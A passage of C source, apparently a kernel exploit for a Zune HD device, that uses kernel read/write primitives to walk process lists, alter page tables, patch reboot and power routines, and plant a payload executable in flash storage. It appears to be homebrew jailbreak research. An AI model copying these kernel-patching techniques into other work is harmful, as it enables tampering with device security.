	//kwr(0x80065BA4, 0xea00326c); // ivp ok = h

	//f in vmcpy phys

	/* Step 5: Defuck kernel (remove our original gadget)*/
	//BYTE buf[] = {0x02, 0x0d, 0, 0, 0, 0, 0, 0};
	//kmemcpy(get_exit_code_thread_ptr, buf, sizeof(buf));
	


	// Magic over

	// Find all processes:


		//DWORD hi = kreadb(0xFFF00000);
//	DWORD hi = 0;
//	std::swprintf(foo, L"read: %x, %d", hi, GetLastError());
   // ZDKSystem_ShowMessageBox(foo, MESSAGEBOX_TYPE_OK);
	
#if 0

	u32 offset_nk = 0x80bee010;
	u32 nk = kreadu32(offset_nk);
	//BYTE buf2[1024] = {0};
	//kmemcpy(base, buf2, sizeof(buf2));

	nk = kreadu32(nk+0);
	nk = kreadu32(nk+0);
	nk = kreadu32(nk+0);
	nk = kreadu32(nk+0);
	nk = kreadu32(nk+0);
	nk = kreadu32(nk+0); // xna
	nk = kreadu32(nk+0);  //udp2tcp
	//nk = kreadu32(nk+0);  // native app
	//nk = kreadu32(nk+0); // nk

	u32 proc_next = kreadu32(nk+0);
	u32 proc_last = kreadu32(nk+4);
	u32 id = kreadu32(nk+0xc);
	u32 proc_name_ptr = kreadu32(nk+0x20);
	u32 ppd = kreadu32(nk+0x2c);

		u32 off = 0;
	std::wstring name;
	u16 c = kreadu16(proc_name_ptr);
	while(c != 0) {
		name.push_back(c);
		off+=2;
		c = kreadu16(proc_name_ptr + off);
	}

#if 0
	char* m = (char*)malloc(1024*1024*16);
	memset(m, 0x12, 1024*1024*16);
	m = (char*)malloc(1024*1024*16);
	memset(m, 0x42, 1024*1024*16);

	//0 1 2 3
	u32 idx = 3;
	u32 ppd_idx = kreadu32(ppd+4*idx);

	u32 test = 0xFFF00C01;//ppd_idx+0x01000000;
	kmemcpy(ppd+4*idx, (BYTE*)&test, 4);

	ppd_idx = kreadu32(ppd+4*idx);

	
	u32 pge = (ppd_idx >> 9) << 9;
	u32 ppp = kreadu32(pge);

		//std::swprintf(foo, L"ppd[%d]:%p", idx, ppd_idx);
	std::swprintf(foo, L"%p : %p : %p : %p", ppd_idx, pge, ppp, test);
	ZDKSystem_ShowMessageBox(foo, MESSAGEBOX_TYPE_OK);
#endif

#if 0
	base = 0x8006c140;
	kwr(0x80060da0, base);

	void* tmp_buf  = calloc(0x20000, 1);
	void* tmp_buf2 = calloc(0x20000, 1);

	HMODULE mh = GetModuleHandleW(L"coredll.dll");
	VCE vce = (VCE) GetProcAddress(mh, L"GetFSHeapInfo");

	SetLastError(0);
	//BOOL r = vce(nk, tmp_buf, NULL, 0x8000, 0x2000, 0x400|0x200|0x4);
    BOOL r = vce(nk, tmp_buf, NULL, (DWORD)tmp_buf2, 0x1000, 0x200|0x4);
	DWORD err = GetLastError();
	//std::swprintf(foo, L"r = %d, dat = %d, err=%d %p, %p, %s", r, *((int*)tmp_buf), err, tmp_buf, mh, name.c_str());
	std::swprintf(foo, L"r = %d, e=%d", f,  err);
	ZDKSystem_ShowMessageBox(foo, MESSAGEBOX_TYPE_OK);
#endif


#endif

#if 1

	DWORD dwThreadId = 0;
    HANDLE hThread = CreateThread(
        NULL,                        
        0,
        Server,
        NULL,
        0,
        &dwThreadId);

	
		WaitForSingleObject(hThread, INFINITE);
	
#endif


	//TODO: get_exit_code_thread_ptr - 0x178 + 0x1ac
	//get_exit_code_thread_ptr - 0x178 + 0x1ac + 4 {+8,+}

	/* tests */
	//BYTE nop[] = { 0x00, 0xf0, 0x20, 0xe3 };
	//BYTE ret[] = { 0x1e, 0xff, 0x2f, 0xe1 };
	//kmemcpy(0x8007255c, ret, sizeof(ret)); // reboot no

	//kmemcpy(0x8006ab3c, nop, sizeof(nop)); // halt no
	//kmemcpy(0x8006ab40, nop, sizeof(nop)); //

	//kmemcpy(0x80073b04, ret, sizeof(ret)); // clean boot no

	//kmemcpy(0x800725d8, ret, sizeof(ret)); // power no

	//ZDKSystem_ShowMessageBox(L"PWNED by CUB3D", MESSAGEBOX_TYPE_OK);

	//todo: unfuck stuff we've broke (perms table) (all)
	// release as app??
	// check fw version
	// 

	return 0;
}


int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nShowCmd) {


#if 0
if(CopyFileW(L"\\gametitle\\584E07D1\\Content\\nativeapp.exe", L"\\Flash2\\payload.exe", false) != TRUE) {
	std::swprintf(foo, L"Copy fail");
	ZDKSystem_ShowMessageBox(foo, MESSAGEBOX_TYPE_OK);
	return 0;
}
#endif

SuppressReboot();

#if 1
CopyFileW(L"\\gametitle\\584E07D1\\Content\\nativeapp.exe", L"\\Flash2\\payload.exe", false);
#endif

#if 0
std::swprintf(foo, L"Hello");
ZDKSystem_ShowMessageBox(foo, MESSAGEBOX_TYPE_OK);
#endif

#if 1
	hax();
#endif

#if 0
	hax_30();
#endif



#if 0

WIN32_FIND_DATA ffd;
   HANDLE hFind = INVALID_HANDLE_VALUE;
   BOOL r=1;
      hFind = FindFirstFile(L"\\Flash2\\p*", &ffd);

if (INVALID_HANDLE_VALUE == hFind) 
   {
	   ZDKSystem_ShowMessageBox(L"BAD", MESSAGEBOX_TYPE_OK);
      return 0;
   } 

for(int i =0; i <9; i++) {
	  r = FindNextFile(hFind, &ffd);
	  if (r == 0) {break;}
}
	  std::swprintf(foo, L"test %s r: %d", ffd.cFileName, r);
ZDKSystem_ShowMessageBox(foo, MESSAGEBOX_TYPE_OK);
#endif

//"\\":
//"Flash/: ok
//"Mounted Volume/": BAD
//Flash2/: ok
//gametitle/: app
//gamert/: xna
//selfcheckcapture.raw
//profiles/default/: bad
//Documents and Settings/default: bad
//my Documents/: bad
//Program files/: bad
//temp/: bad
//windows/

//"\\flash":
//zconfig.dat
//zver.dat

//"\\flash2":
	//zunedb.dat  
	//dncache
//zunedb.bak
//devcert.dat
//drmstore.dat
//browser/
//content/
//dumpfiles/
//runtimecache/

//"\\Windows":
//System.mky
//default.mky
//.. probably just nk

	return 0;
}
